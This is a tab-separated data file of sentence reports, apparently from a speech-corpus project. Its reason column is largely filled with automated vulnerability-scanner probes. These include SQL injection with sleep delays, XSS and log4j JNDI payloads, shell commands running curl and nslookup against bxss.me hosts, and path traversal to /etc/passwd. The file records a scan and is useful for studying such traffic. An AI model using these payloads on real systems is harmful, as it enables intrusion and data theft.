sentence	sentence_id	locale	reason
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	-1" OR 2+811-811-1=0+0+0+1 -- 
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	if(now()=sysdate(),sleep(15),0)
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	0'XOR(if(now()=sysdate(),sleep(15),0))XOR'Z
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	0"XOR(if(now()=sysdate(),sleep(15),0))XOR"Z
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	(select(0)from(select(sleep(15)))v)/*'+(select(0)from(select(sleep(15)))v)+'"+(select(0)from(select(sleep(15)))v)+"*/
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	1 waitfor delay '0:0:15' -- 
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	OqSZ3PfX'; waitfor delay '0:0:15' -- 
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	0tvy7pgO' OR 25=(SELECT 25 FROM PG_SLEEP(15))--
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	ULmCkOdA') OR 696=(SELECT 696 FROM PG_SLEEP(15))--
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	wh2zBidW')) OR 292=(SELECT 292 FROM PG_SLEEP(15))--
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	offensive-language'||DBMS_PIPE.RECEIVE_MESSAGE(CHR(98)||CHR(98)||CHR(98),15)||'
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	1'"
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	@@RICpB
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	offensive-language
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	offensive-language
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	offensive-language
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	XsbjDflz
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	offensive-language'>"></title></style></textarea></noscript></template></script><script/src="//bxss.me/bsp?u=009365&r=354-2361&h=354-a4363-2&"></script>
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	offensive-language
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	offensive-language&n934039=v968104
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	offensive-language%0abcc:[email]
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	${9999446+9999859}
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	offensive-language%00
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	to@example.com>%0d%0abcc:[email]
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	offensive-language
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	response.write(9619139*9543313)
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	offensive-language<esi:include src="http://bxss.me/rpb.png"/>
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	)))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	'+response.write(9619139*9543313)+'
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	)
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	"+response.write(9619139*9543313)+"
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	xfs.bxss.me
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	HttP://bxss.me/t/xss.html?%00
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	str(__import__('time').sleep(9))+__import__('socket').gethostbyname('hitfvnbjpgazn13d91.'+'bxss.me')
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	offensive-language
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	!(()&&!|*|*|
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	'.gethostbyname(lc('hitjb'.'zbgsxduh04b3d.bxss.me.')).'A'.chr(67).chr(hex('58')).chr(119).chr(75).chr(98).chr(80).'
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	bxss.me/t/xss.html?%00
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	'+str(__import__("time").sleep(9))+__import__("socket").gethostbyname("hitfvnbjpgazn13d91."+"bxss.me")+'
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	^(#$!@#$)(()))******
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	http://hitrjzywprniw.bxss.me/
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	".gethostbyname(lc("hitxv"."xqzbqmnr2a28b.bxss.me."))."A".chr(67).chr(hex("58")).chr(122).chr(70).chr(107).chr(71)."
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	"+str(__import__('time').sleep(9))+__import__('socket').gethostbyname('hitfvnbjpgazn13d91.'+'bxss.me')+"
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	'"
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	hitrjzywprniw.bxss.me
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	../../../../../../../../../../../../../../etc/passwd
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	<!--
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	${j${::-n}di:dns${::-:}${::-/}${::-/}hitbofdiudxsk852db${::-.}bxss.me}zzzz${url:UTF-8:http://hitnhusowpqvu.bxss.me/}
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	../../../../../../../../../../../../../../windows/win.ini
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	'"()
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	offensive-language'&&sleep(27*1000)*wsdbgp&&'
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	file:///etc/passwd
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	offensive-language
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	offensive-language"&&sleep(27*1000)*cvcnzp&&"
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	offensive-language
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	;assert(base64_decode('cHJpbnQobWQ1KDMxMzM3KSk7'));
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	offensive-language
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	offensive-language'||sleep(27*1000)*kbhopv||'
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	';print(md5(31337));$a='
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	../offensive-language
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	";print(md5(31337));$a="
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	offensive-language"||sleep(27*1000)*fcoxlo||"
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	${@print(md5(31337))}
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	${@print(md5(31337))}\
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	${${:::::::::::::::::-j}ndi:dns${:::::::::::::::::-:}${::-/}${::-/}dns.log4j.009365.354-2377.354.a4363${::-.}1${::-.}bxss.me}}
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	'.print(md5(31337)).'
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	offensive-language'"()&%<zzz><ScRiPt >AQAS(9371)</ScRiPt>
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	'"()&%<zzz><ScRiPt >AQAS(9173)</ScRiPt>
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	offensive-language9526300
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	http://dicrpdbjmemujemfyopp.zzz/yrphmgdpgulaszriylqiipemefmacafkxycjaxjs%3F.jpg
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	1yrphmgdpgulaszriylqiipemefmacafkxycjaxjs%00.jpg
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	Http://bxss.me/t/fit.txt
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	http://bxss.me/t/fit.txt%3F.jpg
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	/etc/shells
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	c:/windows/win.ini
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	bxss.me
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	offensive-language
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	offensive-language
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	echo ndsxfn$()\ zdxvmc\nz^xyu||a #' &echo ndsxfn$()\ zdxvmc\nz^xyu||a #|" &echo ndsxfn$()\ zdxvmc\nz^xyu||a #
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	&echo pttrcu$()\ vkmtad\nz^xyu||a #' &echo pttrcu$()\ vkmtad\nz^xyu||a #|" &echo pttrcu$()\ vkmtad\nz^xyu||a #
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	|echo udfejb$()\ dgcdij\nz^xyu||a #' |echo udfejb$()\ dgcdij\nz^xyu||a #|" |echo udfejb$()\ dgcdij\nz^xyu||a #
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	(nslookup -q=cname hittqwhldamqpa12ea.bxss.me||curl hittqwhldamqpa12ea.bxss.me))
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	$(nslookup -q=cname hitlytujeqeghc0efd.bxss.me||curl hitlytujeqeghc0efd.bxss.me)
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	&nslookup -q=cname hitlerictennl1621f.bxss.me&'\"`0&nslookup -q=cname hitlerictennl1621f.bxss.me&`'
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	&(nslookup -q=cname hitdxpktuczpgc6f73.bxss.me||curl hitdxpktuczpgc6f73.bxss.me)&'\"`0&(nslookup -q=cname hitdxpktuczpgc6f73.bxss.me||curl hitdxpktuczpgc6f73.bxss.me)&`'
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	|(nslookup -q=cname hithigfilqoitc2b00.bxss.me||curl hithigfilqoitc2b00.bxss.me)
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	`(nslookup -q=cname hiterpbeyanwl4b9ea.bxss.me||curl hiterpbeyanwl4b9ea.bxss.me)`
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	;(nslookup -q=cname hitncotbjkoaq896d7.bxss.me||curl hitncotbjkoaq896d7.bxss.me)|(nslookup -q=cname hitncotbjkoaq896d7.bxss.me||curl hitncotbjkoaq896d7.bxss.me)&(nslookup -q=cname hitncotbjkoaq896d7.bxss.me||curl hitncotbjkoaq896d7.bxss.me)
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	offensive-language
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	offensive-language
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	apS1EgpO
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	-1 OR 2+645-645-1=0+0+0+1 -- 
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	-1 OR 2+150-150-1=0+0+0+1
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	-1' OR 2+485-485-1=0+0+0+1 -- 
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	-1' OR 2+28-28-1=0+0+0+1 or 'sWcFAjSS'='
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	-1" OR 2+128-128-1=0+0+0+1 -- 
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	if(now()=sysdate(),sleep(15),0)
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	0'XOR(if(now()=sysdate(),sleep(15),0))XOR'Z
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	0"XOR(if(now()=sysdate(),sleep(15),0))XOR"Z
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	(select(0)from(select(sleep(15)))v)/*'+(select(0)from(select(sleep(15)))v)+'"+(select(0)from(select(sleep(15)))v)+"*/
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	1 waitfor delay '0:0:15' -- 
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	TqX7I5Gx'; waitfor delay '0:0:15' -- 
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	IPhutiFJ' OR 684=(SELECT 684 FROM PG_SLEEP(15))--
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	peYnjJTx') OR 153=(SELECT 153 FROM PG_SLEEP(15))--
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	7GoA03g1')) OR 157=(SELECT 157 FROM PG_SLEEP(15))--
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	offensive-language'||DBMS_PIPE.RECEIVE_MESSAGE(CHR(98)||CHR(98)||CHR(98),15)||'
